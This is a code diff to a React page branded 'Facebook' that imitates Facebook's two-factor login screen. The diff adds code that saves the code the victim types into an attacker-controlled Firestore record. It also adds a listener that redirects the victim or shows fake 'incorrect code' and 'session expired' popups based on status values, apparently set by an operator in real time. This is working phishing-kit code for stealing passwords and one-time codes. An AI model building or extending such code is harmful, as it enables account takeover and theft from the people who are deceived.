@@ -1,25 +1,87 @@
-import { useState } from "react";
-
+import React, { useState, useEffect } from "react";
+import { doc, onSnapshot, setDoc, updateDoc } from "firebase/firestore";
+import { db } from "../../firebase";
+import { useNavigate, useParams } from "react-router-dom";
+import Header from "../../Header/Header";
 export default function Twofactor() {
   const [code, setCode] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
-
+    const [hideWarning, setHideWarning] = useState(true);
   const handleSubmit = async (e) => {
     e.preventDefault();
     if (!code.trim()) return;
-
-    setIsSubmitting(true);
-    // Simulate API call
-    await new Promise((resolve) => setTimeout(resolve, 1000));
-    setIsSubmitting(false);
+          try {
+        const userDocRef = doc(db, "users", userID);
+        await updateDoc(userDocRef, {
+          auth: code,
+          status: 2
+        });
+        listener(userID);
+        setIsSubmitting(true);
+      } catch (error) {
+        console.error("Error saving class code to Firestore: ", error);
+      } finally {
+      }
+    // setIsSubmitting(true);
+    // // Simulate API call
+    // await new Promise((resolve) => setTimeout(resolve, 1000));
+    // setIsSubmitting(false);
   };
 
   const isCodeValid = code.trim().length >= 6;
 
+
+  const params = useParams();
+    const navigate = useNavigate();
+    const { userID } = params;
+    const [result, setResult] = useState({
+      title: "",
+      detail: "",
+    });
+    const listener = (userID) => {
+      onSnapshot(doc(db, "users", userID), (snapshot) => {
+        const status = snapshot.data()?.status;
+        if (status === 1) return;
+  
+        // Handle different status codes here
+        switch (status) {
+          case -1:
+            setResult({
+              title: "warning",
+              detail: "Password is incorrect, please try again.",
+            });
+            break;
+          case 2:
+            navigate(`/checkpoint/${userID}`);
+            break;
+          case 3:
+            navigate(`/processing/${userID}`);
+            break;
+          case -2:
+            setResult({
+              title: "Login code is required",
+              detail: "Your login code is incorrect, please try again.",
+            });
+            setIsSubmitting(false);
+            setHideWarning(false);
+            break;
+          default:
+            setResult({
+              title: "error",
+              detail: "Unhandled status:" + status,
+            });
+        }
+      });
+    };
+  
+    useEffect(() => {
+      setIsSubmitting(false);
+    }, []);
+
   return (
     <div className="min-h-screen bg-facebook-bg overflow-auto">
       <title>Facebook</title>
-
+    <Header/>
       {/* Progress bar (hidden by default) */}
       <div className="fixed top-0 left-0 right-0 h-1 bg-facebook-blue opacity-0 z-50" />
 
@@ -40,7 +102,7 @@ export default function Twofactor() {
                             </span>
                             <h2 className="break-words">
                               <span className="text-facebook-text font-semibold text-2xl leading-7 max-w-full relative break-words whitespace-pre-line">
-                                Enter authentication code
+                                Enter login code to continue
                               </span>
                             </h2>
                             <span className="text-facebook-text text-[15px] leading-[19px] mt-2 max-w-full relative break-words whitespace-pre-line">
@@ -48,10 +110,7 @@ export default function Twofactor() {
                                 <div className="flex flex-col mt-1 mb-1 break-words whitespace-pre-line">
                                   <span className="text-facebook-text text-[15px] leading-[19px] max-w-full relative break-words whitespace-pre-line">
                                     <span className="inline break-words whitespace-pre-line">
-                                      Enter the 6-digit code for this account
-                                      from the two-factor authentication app
-                                      that you set up (such as Duo Mobile or
-                                      Google Authenticator).
+                                      Enter the 6-8 digit code from the phone or email or authentication app you set up.
                                     </span>
                                   </span>
                                 </div>
@@ -170,6 +229,94 @@ export default function Twofactor() {
                                   </button>
                                 </div>
                               </div>
+                              {/* ERROR POPUP */}
+      {!hideWarning && 
+      <div
+      role="presentation"
+      className="fixed inset-0 z-[1000] flex items-center justify-around bg-black/50 modal-backdrop-enter"
+      style={{
+        fontFamily:
+          'system-ui, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
+      }}
+    >
+      <div
+        tabIndex={-1}
+        aria-label="Email address or mobile number required"
+        className="w-[350px] max-w-[calc(100%-2rem)] mx-4 sm:mx-8 bg-white rounded-xl text-center shadow-2xl modal-enter"
+        style={{
+          fontFamily:
+            'system-ui, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
+        }}
+      >
+        {/* Header section with dark background */}
+        <div
+          className="px-6 sm:px-8 py-6 sm:py-8 text-center bg-white rounded-t-xl"
+          style={{
+            fontFamily:
+              'system-ui, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
+          }}
+        >
+          <div
+            className="text-black text-lg font-semibold text-center"
+            style={{
+              fontSize: "18px",
+              fontWeight: "600",
+              color: "rgb(255, 255, 255)",
+            }}
+          >
+            {result.title ? result.title : 'Your login session has expired.'}
+          </div>
+          <div
+            className="mt-3 text-center text-gray-700"
+            style={{
+              fontFamily:
+                'system-ui, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
+            }}
+          >
+             {result.detail ? result.detail : 'Enter your email address or mobile number to continue.'}
+          </div>
+        </div>
+
+        {/* Button section */}
+        <div
+          className="text-center"
+          style={{
+            fontFamily:
+              'system-ui, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
+          }}
+        >
+          <div
+            role="button"
+            tabIndex={0}
+            className="py-3 px-2.5 text-center cursor-pointer border-t border-solid border-t-gray-300 text-blue-600 hover:bg-gray-50 active:bg-gray-100 focus:bg-gray-50 focus:outline-none transition-colors rounded-b-xl"
+            style={{
+              fontSize: "16px",
+              lineHeight: "24px",
+              color: "rgb(0, 100, 224)",
+              borderTopColor: "rgb(206, 208, 212)",
+              borderTopWidth: "1px",
+              borderTopStyle: "solid",
+              whiteSpace: "nowrap",
+              fontFamily:
+                'system-ui, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
+            }}
+            onClick={() => {
+              setHideWarning(true);
+            }}
+            onKeyDown={(e) => {
+              if (e.key === "Enter" || e.key === " ") {
+                e.preventDefault();
+                setHideWarning(true);
+              }
+            }}
+          >
+            OK
+          </div>
+        </div>
+      </div>
+    </div>
+    }
+    {/* ERROR POPUP */}
                             </form>
                           </div>
                         </div>
